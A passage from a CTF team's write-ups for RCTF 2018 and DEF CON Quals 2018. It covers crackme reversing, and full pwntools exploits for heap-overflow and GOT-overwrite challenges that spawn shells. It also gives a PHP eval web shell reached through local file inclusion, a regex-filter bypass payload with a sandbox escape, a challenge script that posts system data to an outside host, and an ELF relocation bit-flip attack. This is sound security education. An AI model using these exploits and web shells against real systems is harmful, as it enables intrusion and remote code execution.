3, which the second thread was ready to catch (well, it wasn\u0026rsquo;t when running the binary in IDA as no two debuggers can be attached at the same time, but you get the idea). This second thread then decrypted a checker function which ignored the previous encryption on the flag by using another copy of it and proceeded to, duh, check it.\nThe decryptor was this function:\nvoid __usercall __noreturn sub_400FDC(__int64 a1@\u0026lt;rbp\u0026gt;) { *(_QWORD *)(a1 - 24) = sub_401482; *(_BYTE *)(a1 - 31) = \u0026#39;R\u0026#39;; *(_BYTE *)(a1 - 30) = \u0026#39;i\u0026#39;; *(_BYTE *)(a1 - 29) = \u0026#39;g\u0026#39;; *(_BYTE *)(a1 - 28) = \u0026#39;h\u0026#39;; *(_BYTE *)(a1 - 27) = \u0026#39;t\u0026#39;; *(_BYTE *)(a1 - 26) = \u0026#39;!\u0026#39;; *(_BYTE *)(a1 - 25) = \u0026#39;\\0\u0026#39;; for ( *(_QWORD *)(a1 - 8) = 0LL; *(_QWORD *)(a1 - 8) \u0026lt; 0x162uLL; ++*(_QWORD *)(a1 - 8) ) *(_BYTE *)(*(_QWORD *)(a1 - 24) + *(_QWORD *)(a1 - 8)) ^= 0x28u; if ( (unsigned __int8)sub_401482(\u0026amp;qword_6020E0) ) puts((const char *)(a1 - 31)); if ( pid ) kill(pid, 9); exit(0); } And, as said before, it xors the actual checker, sub_401482, with 0x28 before executing it on the flag. Let\u0026rsquo;s have a look at the checker and the functions it uses, as that\u0026rsquo;s where we can understand what the flag has to be.\n_BOOL8 __fastcall sub_401482(_DWORD *flag) { int target[6]; // [rsp+8h] [rbp-40h] int mul[6]; // [rsp+28h] [rbp-20h] int v5; // [rsp+40h] [rbp-8h] int i; // [rsp+44h] [rbp-4h] mul[0] = 0x556E4969; mul[1] = 0x2E775361; mul[2] = 0x893DAE7; mul[3] = 0x96990423; mul[4] = 0x6CF9D3E9; mul[5] = 0xA505531F; target[0] = 0x54A0B9BD; target[1] = 0x4B818640; target[2] = 0x8EB63387; target[3] = 0xA9EABEFD; target[4] = 0xB8CDF96B; target[5] = 0x113C3052; for ( i = 0; i \u0026lt;= 5; ++i ) { if ( mul[i] * flag[i] != target[i] ) return 0LL; } if ( (unsigned int)check1(flag[6], *((unsigned __int16 *)flag + 14), 0xF64BB17D) != 1870842076 || (unsigned int)check2(*((_WORD *)flag + 14), *((_WORD *)flag + 15)) != 42134 ) { return 0LL; } v5 = 0; for ( i = 24; i \u0026lt;= 31; ++i ) v5 ^= *((char *)flag + i); return v5 == 22 \u0026amp;\u0026amp; *((_BYTE *)flag + 32) == \u0026#39;s\u0026#39;; } unsigned __int64 __fastcall check1(unsigned int b, unsigned int e, unsigned int n) { unsigned __int64 v5; // [rsp+Ch] [rbp-10h] unsigned __int64 res; // [rsp+14h] [rbp-8h] res = 1LL; v5 = b; while ( e ) { if ( e \u0026amp; 1 ) res = v5 * res % n; v5 = v5 * v5 % n; e \u0026gt;\u0026gt;= 1; } return res; } __int64 __fastcall check2(unsigned __int16 a, unsigned __int16 a2) { unsigned __int16 v2; // ST16_2 unsigned __int16 b; // [rsp+0h] [rbp-18h] for ( b = a2; b \u0026amp; a; b = 2 * (b \u0026amp; v2) ) { v2 = a; a ^= b; } return (unsigned __int16)(b | a); } Actual reversing # The first 6 dwords if the flag are checked by multiplying each one by a constant and checking against another constant, as it\u0026rsquo;s all 32 bit it\u0026rsquo;s nothing we can\u0026rsquo;t bruteforce - 24 characters done. The last byte is trivially an s - one more done. The remaining 8 are a bit trickier, as I had to find a way to bruteforce them quickly enough. The first thing needed was reversing check1 and check2. The first one is modular exponentiation, thus check1(b, e, n) = (b**e) % n. The second one looks messy with all those bit operations but it\u0026rsquo;s nothing more than a sum modulo 2**16. With this information in mind let\u0026rsquo;s setup a bruteforce:\nTrying all 2**64 combinations is just too slow But thanks to check2 we know the sum of the last two 16bit chunks is 42134. Let\u0026rsquo;s bruteforce only one and get the other 2**48 combinations is still too many\u0026hellip; We know the xor of all 8 bytes is 22, we can thus only iterate over 3 of the remaining 4 2**40 combinations, we\u0026rsquo;re getting onto something Let\u0026rsquo;s only check printable characters, the ones in [0x20, 0x7F] That\u0026rsquo;s less than 2**35 tests, feasible in a few seconds! And so this mess was born, a mess that nonetheless gave us the flag:\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstdint\u0026gt; uint64_t check1(unsigned int a1, unsigned int a2, unsigned int a3) { unsigned int v4; // [rsp+4h] [rbp-18h] uint64_t v5; // [rsp+Ch] [rbp-10h] uint64_t v6; // [rsp+14h] [rbp-8h] v4 = a2; v6 = 1LL; v5 = a1; while ( v4 ) { if ( v4 \u0026amp; 1 ) v6 = v5 * v6 % a3; v5 = v5 * v5 % a3; v4 \u0026gt;\u0026gt;= 1; } return v6; } int main() { uint32_t v9[] = {0x556E4969, 0x2E775361, 0x893DAE7, 0x96990423, 0x6CF9D3E9, 0xA505531F}; uint32_t v3[] = {0x54A0B9BD, 0x4B818640, 0x8EB63387, 0xA9EABEFD, 0xB8CDF96B, 0x113C3052}; char output[34] = {0}; // Bruteforce the first 24 bytes for(int i = 0; i \u0026lt; 6; i++) { uint32_t val = 0; while(1) { if(v9[i] * val == v3[i]) { printf(\u0026#34;%02X%02X%02X%02X\u0026#34;, val \u0026amp; 0xFF, (val \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (val \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (val \u0026gt;\u0026gt; 24) \u0026amp; 0xFF); ((uint32_t *)output)[i] = val; } val++; if(val == 0) break; } } // v0, v1, ..., v7 are the 8 bytes we\u0026#39;re looking for for(uint32_t v4 = 0x20; v4 \u0026lt;= 0x7F; v4++) { printf(\u0026#34;v4 %d\\n\u0026#34;, v4); for(uint32_t v5 = 0x20; v5 \u0026lt;= 0x7F; v5++) { uint32_t v45 = v4 | (v5 \u0026lt;\u0026lt; 8); uint32_t v67 = (42134 - v45 + 0x10000) \u0026amp; 0xFFFF; uint32_t v6 = v67 \u0026amp; 0xFF, v7 = (v67 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF; if(v6 \u0026lt; 0x20 || v6 \u0026gt; 0x7F || v7 \u0026lt; 0x20 || v7 \u0026gt; 0x7F) continue; uint32_t x = v4 ^ v5 ^ v6 ^ v7; for(uint32_t v0 = 0x20; v0 \u0026lt;= 0x7F; v0++) { for(uint32_t v1 = 0x20; v1 \u0026lt;= 0x7F; v1++) { for(uint32_t v2 = 0x20; v2 \u0026lt;= 0x7F; v2++) { uint32_t x1 = v0 ^ v1 ^ v2; uint32_t v3 = x ^ x1 ^ 22; if(v3 \u0026lt; 0x20 || v3 \u0026gt; 0x7F) continue; uint32_t v0123 = v0 | (v1 \u0026lt;\u0026lt; 8) | (v2 \u0026lt;\u0026lt; 16) | (v3 \u0026lt;\u0026lt; 24); if(check1(v0123, v45, 0xF64BB17D) == 0x6F82C8DC) { ((uint32_t *)output)[6] = v0123; ((uint16_t *)output)[14] = v45; ((uint16_t *)output)[15] = v67; // Sorry Dijkstra, I\u0026#39;m using a goto... goto fi; } } } } } } fi:; output[32] = \u0026#39;s\u0026#39;; output[33] = 0; printf(\u0026#34;RCTF{\\%s}\\n\u0026#34;, output); } In just a few seconds it prints out RCTF{5o_M@ny_an7i_Rev3rsing_Techn!qu3s}. Done!\nRNote4 # Attachment\nDisclaimer: this is an unintended solution. No PIE and no leaks, it\u0026rsquo;s evidently intended to be exploited via dl-resolve. Looks like I had a brain fart and didn\u0026rsquo;t think about that.\nOverview # We\u0026rsquo;re given a 64-bit Linux ELF. Checksec shows canaries and NX, but no RELRO and PIE.\nThe binary\u0026rsquo;s main loop reads a choice byte from stdin, and executes an action based on it.\nOption 1 allocates a note:\nstruct note { size_t size; char *ptr; }; void allocate() { unsigned __int8 size; int i; struct note *note; if (g_num_notes \u0026gt; 32) exit(-1); size = 0; note = calloc(sizeof(struct note), 1); if (!note) exit(-1); read_exactly(\u0026amp;size, 1); if (!size) exit(-1); note-\u0026gt;ptr = calloc(size, 1); if (!note-\u0026gt;ptr) exit(-1); read_exactly(note-\u0026gt;ptr, size); note-\u0026gt;size = size; for (i = 0; i \u0026lt;= 31 \u0026amp;\u0026amp; g_notes[i]; ++i); g_notes[i] = note; ++g_num_notes; } Options 2 edits a note:\nvoid edit() { unsigned __int8 idx; unsigned __int8 read_size; struct note *note; idx = 0; read_exactly(\u0026amp;idx, 1); if ( !g_notes[idx] ) exit(-1); note = g_notes[idx]; read_size = 0; read_exactly(\u0026amp;read_size, 1); read_exactly(note-\u0026gt;ptr, read_size); } Option 3 deletes a note:\nvoid delete() { unsigned __int8 idx; idx = 0; read_exactly(\u0026amp;idx, 1); if (idx \u0026gt; 32) exit(-1); free(g_notes[idx]-\u0026gt;ptr); free(g_notes[idx]); g_notes[idx] = 0; } Vulnerability # There\u0026rsquo;s an evident buffer overflow in the edit option. It reads a size up to 255 bytes, and then reads that many bytes into the note, without regard for the note\u0026rsquo;s allocated size.\nExploitation # We allocate a couple notes to get the second note\u0026rsquo;s struct note after the first note\u0026rsquo;s buffer. By overflowing from the first note\u0026rsquo;s buffer into the second note\u0026rsquo;s struct note, we can control the second note\u0026rsquo;s ptr and obtain arbitrary write via edit. However, we have no leaks.\nI decided to do a partial overwrite of a GOT entry. I assumed the libc was the same as the other challenges (2.23-0ubuntu10). There\u0026rsquo;s a GOT entry for alarm, which is close to the exec* family in libc: they differ in the lower 16 bits. Since the low 12 bits are not affected by ASLR, this is a 4 bit bruteforce, which is absolutely feasible. We need to make sure alarm has been lazy linked. It\u0026rsquo;s used at the beginning of main, before the actions loop:\nif (argc \u0026gt; 1) { v3 = atoi(argv[1]); alarm(v3); } This will be used on the remote server to set a timeout for the process, so alarm will be already resolved by the time we overwrite the GOT.\nWhile alarm can be hijacked to an exec* function, there are a couple issues. It\u0026rsquo;s not called after the corruption, and the arguments wouldn\u0026rsquo;t match anyway. Therefore, I built a chain of corrupted GOT entries to perform an execv call.\nThe binary contains this initialization function (called at the beginning of main):\nvoid __cdecl initialize() { memset(g_notes, 0, 256); g_num_notes = 0; setvbuf(stdin, 0, 2, 0); } Remember that g_notes is in BSS (no PIE). Also, we know we can easily trigger a free at will through option 3.\nThe final sequence is:\nwrite /bin/sh\\x00 to g_notes; partially overwrite alarm\u0026rsquo;s GOT entry with execv (guessing 4 bits); overwrite memset\u0026rsquo;s GOT entry with alarm\u0026rsquo;s PLT entry; overwrite free\u0026rsquo;s GOT entry with the address of initialize. Now we call free, which is hijacked to initialize. The call to memset(g_notes, 0, 256) will actually go through alarm\u0026rsquo;s PLT and end up calling execv(g_notes, NULL), which will pop a shell since g_notes contains /bin/sh\\x00.\n$ cat flag RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c} Yeah, that\u0026rsquo;s not exactly what I did. It was meant to be solved via dl-resolve.\nExploit code # #!/usr/bin/env python2 from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;x86_64\u0026#39;) def menu(n): p.send(p8(n)) buffers = [False] * 32 def reset(): global buffers buffers = [False] * 32 def allocate(content): menu(1) p.send(p8(len(content))) p.send(content) idx = buffers.index(False) buffers[idx] = True return idx def edit(idx, content): menu(2) p.send(p8(idx)) p.send(p8(len(content))) p.send(content) def delete(idx): menu(3) p.send(p8(idx)) buffers[idx] = False INITIALIZE = 0x400ad2 BUFFERS = 0x6020c0 ALARM_GOT = 0x602030 ALARM_PLT = 0x400650 MEMSET_GOT = 0x602028 FREE_GOT = 0x602018 EXECV_LOW = 0x860 prog = log.progress(\u0026#39;Bruteforcing execv\u0026#39;) while True: p = remote(\u0026#39;rnote4.2018.teamrois.cn\u0026#39;, 6767) reset() allocate(\u0026#39;A\u0026#39;) # avoids messing with corrupted idx 0 overflow = allocate(\u0026#39;A\u0026#39;) victim = allocate(\u0026#39;A\u0026#39;) def write(addr, data): edit(overflow, \u0026#39;A\u0026#39;*0x18 + p64(0x21) + p64(31337) + p64(addr)) edit(victim, data) try: # pwn got write(BUFFERS, \u0026#39;/bin/sh\\x00\u0026#39;) write(ALARM_GOT, p16(EXECV_LOW)) # guess 4bit = 0 write(MEMSET_GOT, p64(ALARM_PLT)) write(FREE_GOT, p64(INITIALIZE)) # free(...) -\u0026gt; memset(BUFFERS, 0, 256) -\u0026gt; execv(BUFFERS, 0) delete(overflow) p.sendline(\u0026#39;echo PWNED\u0026#39;) if \u0026#39;PWNED\u0026#39; in p.recvline(timeout=1): prog.success() log.info(\u0026#39;Dropping to shell\u0026#39;) p.interactive() break except EOFError: pass p.close() backdoor # Overview # We are given the control.sh from the compiler challenge:\n#!/bin/bash # No, flag is not hidden in this file # This\u0026#39;s entrypoint of backdoor, web # From here, `compiler` and `backdoor` are independent # Now dear web player, have fun~ debuggers=$(ps auxf | grep \u0026#34;wireshark\\|tshark\\|idaq\\|strace\\|gdb\\|edb\\|lldb\\|lida\\|hopper\\|r2\\|radare2\u0026#34; | grep -v grep | wc -l) if [ \u0026#34;$debuggers\u0026#34; -ge \u0026#34;0\u0026#34; ] then curl -d \u0026#34;Oh, no! He\u0026#39;s debugging! I\u0026#39;ll kill them!!!!!!\u0026#34; -H \u0026#34;User-Agent: $(uname -a)\u0026#34; http://backdoor.2018.teamrois.cn/post.php?action=debugging\\\u0026amp;count=$debuggers fi killall -9 wireshark killall -9 tshark killall -9 idaq killall -9 strace killall -9 gdb killall -9 edb killall -9 lldb killall -9 lida killall -9 hopper killall -9 r2 killall -9 radare2 head -c100000 /dev/urandom \u0026gt; /tmp/random.txt zip -r - /tmp/random.txt | curl -H \u0026#34;User-Agent: $(uname -a)\u0026#34; -F \u0026#39;file=@-\u0026#39; http://backdoor.2018.teamrois.cn/post.php\\?action\\=upload -v rm /tmp/random.txt echo \u0026#34;Did you find the backdoor?\u0026#34; \u0026gt; ~/rctf-backdoor.txt Here we can see two entry points for this challenge: http://backdoor.2018.teamrois.cn/post.php?action=upload and http://backdoor.2018.teamrois.cn/post.php?action=debugging\u0026amp;count=$debuggers.\nThe upload action takes a .zip file as input, and loads it to the uploads/ directory with a random name. The debugging action seems to be useless. Both these two pages, at a first sight, may save the user-agent.\nThere is also a index.php page, with a wordpress-like login, but it seems pretty useless.\nLocal file inclusion # After some tries, we see that if we prepend a ./ to the action parameter, that page loads normally. This means we have a local file inclusion, and after some other successful experiments (like requesting /upload.php or post.php?action=index) we understood that it includes the page from the same directory, appending a .php extension to the value that we requested. The http:// wrapper and the data: wrapper didn\u0026rsquo;t work. But wait, we have a file upload!\nRemote code execution # We can upload arbitrary .zip files. So we can zip a bk.php file, use PHP\u0026rsquo;s zip: wrapper, and then include our bk.php file. Our bk.php is very simple:\n\u0026lt;?php eval($_GET[\u0026#39;cmd\u0026#39;]); We upload it, take its name, and include it with the following request:\nhttp://backdoor.2018.teamrois.cn/post.php?action=zip://./uploads/\u0026#34;+hash+\u0026#34;%23bk\u0026amp;cmd=system(\u0026#39;cat *\u0026#39;); Where hash is the name of the uploaded zip. This request will print the flag: RCTF{the_way_1t_leAds_mE_To_be_In_1ove}\nr-cursive # Overview # LUL dat font http://r-cursive.ml\nHint:\nIf you get stuck after arbitrary code execution, try to escape the sandbox. phpinfo may help you figure out how the sandbox works.\nRemote Code Execution # Going to http://r-cursive.ml gives us a page with the following source code:\n\u0026lt;?php $token = sha1($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); $dir = \u0026#39;../sandbox/\u0026#39;.$token.\u0026#39;/\u0026#39;; is_dir($dir) ?: mkdir($dir); is_file($dir.\u0026#39;index.php\u0026#39;) ?: file_put_contents($dir.\u0026#39;index.php\u0026#39;, str_replace(\u0026#39;#SHA1#\u0026#39;, $token, file_get_contents(\u0026#39;./template\u0026#39;))); switch($_GET[\u0026#39;action\u0026#39;] ?: \u0026#39;\u0026#39;){ case \u0026#39;go\u0026#39;: header(\u0026#39;Location: http://\u0026#39;.$token.\u0026#39;.sandbox.r-cursive.ml:1337/\u0026#39;); break; case \u0026#39;reset\u0026#39;: system(\u0026#39;rm -rf \u0026#39;.$dir); break; default: show_source(__FILE__); } ?\u0026gt; If we visit http://r-cursive.ml/?action=go, it will create a directory in a sandboxed environment and it will put a index.php file in it with the following code:\n\u0026lt;?php sha1($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) === \u0026#39;#SHA1#\u0026#39; ?: die(); \u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[^\\W_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;cmd\u0026#39;]) ? eval($_GET[\u0026#39;cmd\u0026#39;]) : show_source(__FILE__); Finally, it will redirect us to that page, located at *token*.sandbox.r-cursive.ml:1337/.\nHere there is an obvious arbitrary code execution, if we manage to bypass the filter\u0026hellip; Looking at the regex, we understand that it will only accept code in the form of foo(bar(...)), with an arbitrary number of nested function calls, where the outer function takes the inner function\u0026rsquo;s return value as its only parameter. To execute code we can use eval(), but we need to find a way to pass an arbitrary string to it. Googling a bit, we came across getallheaders(), a nice function that returns an array containing all the request headers. Now that we have arbitrary input, we only need to implode() the array to have a string, and then pass it to eval(). The final payload is an HTTP request like this:\nGET /?cmd=eval(implode(getallheaders())); HTTP/1.1 a: print(\u0026#39;Hello world!\u0026#39;); // Host: *token*.sandbox.r-cursive.ml:1337 And now, where is the flag?\nSandbox escape # We are inside a sandbox, with all the useful function like system or exec disabled by php.ini, and with a strict open_basedir. About open_basedir, we see in the phpinfo() that it is restricted only to /tmp and to our sandbox, that is in the form of sandbox/*token*. In /tmp or in our sandbox there isn\u0026rsquo;t anything useful. In the phpinfo() we noticed than there is a preloaded file, sandbox/init.php. What if this init.php is the file responsible for the open_basedir restriction? So I tried to play with the DNS wildcard, to see if I could escape from the sandbox from there. We tried deleting the token, and the server responded with a 404\u0026hellip; that\u0026rsquo;s interesting. And then I tried requesting init.php\u0026hellip; 200! Bingo, we are outside the sandbox. We then requested the index.php inside our sandbox, and indeed the open_basedir now points only to sandbox/ and /tmp. I then read the init.php file, finding the flag inside: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}.\nFinal payload:\nGET /*token*/?cmd=eval(implode(getallheaders())); HTTP/1.1 A: print(file_get_contents(\u0026#39;../init.php\u0026#39;)); // Host: .sandbox.r-cursive.ml:1337 ","date":"27 May 2018","externalUrl":null,"permalink":"/writeups/2018-05-27-rctf-2018-all-writeups/","section":"","summary":"","title":"Rctf 2018 - Write ups","type":"writeups"},{"content":"After 10 years Italy is back to DEFCON. Incredible 2nd place! Great work mhackeroni and thanks to all the team members !\nIn the news # Difesa e attacco a Las Vegas, sfida tra hacker da tutto il mondo. Italiani favoriti - la Repubblica Hacker s√¨, ma con un‚Äôetica: ecco i ‚Äúmhackeroni‚Äù - Il Giorno Squadra di studenti italiani tra i migliori hacker etici al mondo - Italpress ","date":"24 May 2018","externalUrl":null,"permalink":"/news/2018-05-24-defconctfquals-2018-report/","section":"","summary":"","title":"mhackeroni qualifies to DEFCON CTF 2018 Finals!","type":"news"},{"content":"This is the collection of writeups for the DEF CON Quals 2018 by the mhackeroni team.\nIndex # Adamtune - Babypwn1805 - Bitflipper - Ddtek: Preview - Easy Pisy - Elastic Cloud Compute - ELF Crumble - Exzendtential-crisis - Flagsifier - Geckome - Ghettohackers: Throwback - It\u0026rsquo;s-a me! - Note Oriented Programming - Official - PHP Eval White-List - Ps-secure - Race Wars - Sbva - Shellql - TechSupport - WWW - You Already Know\nComments section # Adamtune # Hey folks! We really wanted to write-up this challenge for you \u0026ndash; but we decided to let Adam Doup√© personally explain it instead.\nhttps://youtu.be/3-4cnyswp4w\nBabypwn1805 # Reading the provided C source file we found the two stack based 1024 bytes buffer overflow and the \u0026ldquo;write 8 bytes in a position relative to the bss asdf variable\u0026rdquo; possibility with the second read.\nAt first we tried using the stack buffer overflow to ovewrite last byte of the pointer to the name string of the program. We discovered leaking the env that there was a preloaded custom libc, probably different each time.\nSecond step was to going backwards in the bss writing only 1 byte, trying to find where the entry for the read is on the GOT. Overwriting the LSB we manage to call different functions when the offset is -56 from the variable in bss.\nThen we setup a bruteforce of the last two bytes of the read GOT entry, trying to hit a one_gadget (single address to call execv(\u0026quot;/bin/sh/\u0026quot;)).\nWe found that a few addresses returned some error related to /bin/sh having the wrong parameters, so we did another bruteforce, this time trying to jump few bytes before or after those addresses that returned a good output.\nWe managed to execute the echo command provided, so we refined the payload to cat the flag.\nExploit (final iteration) # #!/usr/bin/env python from __future__ import print_function import sys import struct import hashlib from pwn import * from random import randint import signal import sys host = \u0026#39;e4771e24.quals2018.oooverflow.io\u0026#39; port = 31337 def signal_handler(signal, frame): print(\u0026#39;You pressed Ctrl+C!\u0026#39;) sys.exit(0) signal.signal(signal.SIGINT, signal_handler) print(\u0026#39;Press Ctrl+C\u0026#39;) def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while True: if check_pow(challenge, n, candidate): return candidate candidate += 1 def solve_pow2(challenge, n): r = remote(\u0026#34;\u0026lt;ip of our leet server\u0026gt;\u0026#34;,13337) r.sendline(\u0026#34;{} {}\u0026#34;.format(challenge,n)) return int(r.recvuntil(\u0026#34;\\n\u0026#34;)[:-1]) context(log_level=\u0026#39;DEBUG\u0026#39;) magics=[0x782a,0x1cbe,0xa821,0x580e,0x6372,0x6fc3,0x5463,0x8076,0x7818,0x834,0x2812,0x4aa8,0x7fc7,0x4019,0x6bb2,0x4bba,0x2ff4,0x206e,0x6078,0x2ff7,0x6037,0x5fc7,0x181d,0x4075,0x5be1,0x9ff6,0x981e,0x9bdc,0x3fff,0x7826,0x581f,0x4aac,0x781b,0x1ee5,0x11d2,0x7d78,0xed9,0x46e7,0xa01d,0x701d] conn = remote(host,port) funziona=[0x280d,0x2807,0xa02e,0x581d,0x1808,0xa02e,0x11e5,0x808b,0x607d] def connect(): global conn conn.close() conn = remote(host,port) conn.recvuntil(\u0026#39;Challenge: \u0026#39;) challenge = conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] conn.recvuntil(\u0026#39;n: \u0026#39;) n = int(conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) # print(\u0026#39;Solving challenge: \u0026#34;{}\u0026#34;, n: {}\u0026#39;.format(challenge, n)) solution = solve_pow2(challenge, n) # print(\u0026#39;Solution: {} -\u0026gt; {}\u0026#39;.format(solution, pow_hash(challenge, solution))) conn.sendline(str(solution)) conn.recvuntil(\u0026#34;Go\\n\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: while True: while True: try: connect() break except: continue while True: try: conn.clean_and_log() conn.send(p64(2**64 - 56))#read@GOT # conn.send(p64(2**64 - 88))#read@ # randPart = randint(-0x18,0x18) # currentMagic = random.choice(magics) + randPart currentMagic = random.choice(funziona) log.info(\u0026#34;Current \u0026#34;+hex(currentMagic)) sleep(0.1) conn.send(p16(currentMagic)) # conn.send(p64(0x7ffff7af1cde)) sleep(0.1) conn.sendline(\u0026#34;echo -n ZIOPANEFUNZIONA;cat ../home/flag\u0026#34;) sleep(0.1) resp = conn.recvuntil(\u0026#34;Go\\n\u0026#34;) # if (len(resp)==0): # conn.sendline(\u0026#39;uname -a;echo -n \u0026#34;LODODIO\u0026#34;;\u0026#39;) # else: # continue # res = conn.recvuntil(\u0026#34;Go\\n\u0026#34;) if(\u0026#34;Go\\n\u0026#34; in resp ): resp = resp.replace(\u0026#34;Go\\n\u0026#34;,\u0026#34;\u0026#34;) if(len(resp)\u0026gt;0): log.warning(\u0026#34;Executed stuff \u0026#34;+ hex(currentMagic)+ \u0026#34; : \u0026#34;+ repr(resp)) except EOFError: log.warning(\u0026#34;EOF\u0026#34;) break Bitflipper # Type: reverse-ish, flag value: 177pt. Served at 61421a06.quals2018.oooverflow.io:5566.\nThe wrapper # We are given access to a server that runs a packed ELF x86-64 program. Before running the binary, it tells us:\n------------------------------------------------------- Bitflipper - ELF Fault Injection Framework ------------------------------------------------------- Test program md5: 30acc4aee186d6aef8e9e2036008a710 ------------------------------------------------------- How many faults you want to introduce? The wrapper gives us the possibility to \u0026ldquo;introduce faults\u0026rdquo; in the binary before it is run, which means flipping between 0 and 4 bits (at whichever offset we like) in the binary. It also gives us the MD5 hash of the file, which will be helpful to us later to make some checks.\nAnswering \u0026ldquo;0\u0026rdquo; for the number of faults to add will make the wrapper run the program without modifying it, giving us its normal output:\nHow many faults you want to introduce? 0 Alright, you are the boss. Here is the output of the original program... ------------------------------------------------------- README abc.jpg archive.zip beta.doc celtic.png dir secret_flag.txt test.doc version.txt Interesting\u0026hellip; we have a secret_flag.txt in the current folder.\nAnswering a number n between 1 and 4 will, on the other hand, make the wrapper ask for n offsets of the n bits which are going to be flipped:\nHow many faults you want to introduce? 2 That sounds like a good number Which bit do you want to flip (0-81727)? 1337 Which bit do you want to flip (0-81727)? 31337 2 bits have been flipped MD5 of the new version: 7b41910eb8c1512fa5e8f97f203ba58e Let me run the program for you now... We are given the MD5 hash of the modified file, then the wrapper tries to run it and give us the output. Fiddling around with the offsets of the bits to flip we are very easily able to \u0026ldquo;break\u0026rdquo; the binary. We can, for example: corrupt the ELF header, make it go into segmentation fault, tamper with symbol relocations, trigger a double free() causing a vmmap dump and backtrace, and so on.\nMaking the program crash will cause the wrapper to send us an important hint:\nLooks like you broke it! I would send you a core dump, but I could not find any in the current directory Cool! This means that if we manage to flip some bits in the ELF header to make it become an ELF core file, the server will send us the entire binary!\nIndeed, flipping bits 128, 129 and 130, changing the byte at offset 0x10 from 0x03 to 0x04, works just fine! Now we have a binary we can disassemble and begin to work on.\nThe binary # By computing the MD5 hash of the file we just got from the server we can verify that it is indeed the same binary which is run by the wrapper server-side. Moreover, we can now try out various combinations of bit flips and check the new local MD5 with the remote MD5 to check if we correctly flipped the bits.\nThe program itself is not really interesting: it outputs a simple sorted list of the files in the current folder coloring their name using ANSI escape codes. What is interesting is that by crashing the binary with a double free() we can get a vmmap dump from which we can find out the libc version being used:\n... 7ff226ddb000-7ff226f9b000 r-xp 00000000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so 7ff226f9b000-7ff22719b000 ---p 001c0000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so 7ff22719b000-7ff22719f000 r--p 001c0000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so 7ff22719f000-7ff2271a1000 rw-p 001c4000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so ... We now know that it is using libc-2.23, and we assume the distro is, as usual, Ubuntu 16.04.4 LTS (Xenial Xerus).\nThe exploit # Now, getting into the real exploit: as said earlier, since we can modify up to four bits at arbitrary locations in the file, if precisely calculated, we can corrupt an Elf64_Rela structure in the PLT relocation table (.rela.plt) to trick the loader into writing the address of the specified symbol to an address (r_offset) in the GOT PLT (.plt.got), and, most importantly, adding a given offset (r_addend) to the absolute address (in the libc).\nThe Elf64_Rela struct is defined like this:\ntypedef struct { Elf64_Addr r_offset; Elf64_Xword r_info; Elf64_Sxword r_addend; } Elf64_Rela; We now have three different approaches to modify the execution flow of the program to fullfill our objective (which is obviously to execute a shell):\nModify the index of a symbol moving one of the functions used by the binary in another position in the PLT so that the program would call a different function instead of the expected one. Changing r_offset could also be possible, but harder to manage. This was not of great help since the binary doesn\u0026rsquo;t use interesting functions (like system or similars).\nModify r_addend making the loader load a different function in the GOT (if it is close enough the original one). This was again not the case, since all of the \u0026ldquo;cool\u0026rdquo; libc functions (system, execve, popen, \u0026hellip;) were either too far or unreachable flipping only 4 bits of r_addend (i.e. setting only four bits to 1).\nAny combination of the first two: applying both of the above modifications for a symbol, so that calling a specific function would result in jumping in a different PLT entry than the expected one, and following the GOT entry of the latter would cause to call a totally different libc function than the original.\nTo help us identify which function could have been replaced with wich, we wrote an helper script which did the maths for us. An example output filtered with grep execv is the following (the full list was actually more than 2000 lines):\nreaddir execv 0xcc860 0b100010001000000 0 3 closedir execvp 0xccbc0 0b100100000000000 0 2 closedir execvp 0xccbc0 0b100100000000001 1 3 closedir execvp 0xccbc0 0b100100000000010 2 3 closedir execvp 0xccbc0 0b100100000000100 4 3 closedir execvp 0xccbc0 0b100100000001000 8 3 strlen fexecve 0xcc7a0 0b1000001000010000000 0 3 strlen execve 0xcc770 0b1000001000001000000 -16 3 Unfortunately none of the functions reachable by tampering an Elf64_Rela structure were useful, since most of them were just random and useless \u0026ldquo;normal\u0026rdquo; functions, and the few interesting ones (like exec{l,ve,vpe}) were reachable but would have ended up being called with the wrong arguments.\nWe finally ran one_gadget on the libc-2.23 binary, discovered four useful gedgets to run execve('/bin/sh', NULL, NULL) and added their address to the input of our script: three of them were completely out of range of the possible addresses that we could make the loader write into GOT, but one was close enough:\nopendir gadget4 0xf1147 0b101001000000000000 -7 3 which was:\nf1147: 48 8b 05 6a 2d 2d 00 mov rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8 \u0026lt;__environ@@GLIBC_2.2.5-0x3080\u0026gt; f114e: 48 8d 74 24 70 lea rsi,[rsp+0x70] f1153: 48 8d 3d fd bb 09 00 lea rdi,[rip+0x9bbfd] # 18cd57 \u0026lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197\u0026gt; f115a: 48 8b 10 mov rdx,QWORD PTR [rax] f115d: e8 0e b6 fd ff call cc770 \u0026lt;execve@@GLIBC_2.2.5\u0026gt; This gadget executes execve(\u0026quot;/bin/sh\u0026quot;, rsp+0x70, environ), so we actually would need rsp+0x70 to be NULL to be sure to not get a SIGSEGV or to not call /bin/sh some_garbage_args, but it was well worth a try: using the third approach explained above, we can modify the Elf64_Rela struct of the opendir symbol (by flipping the bits 0x7fa*8 +1, 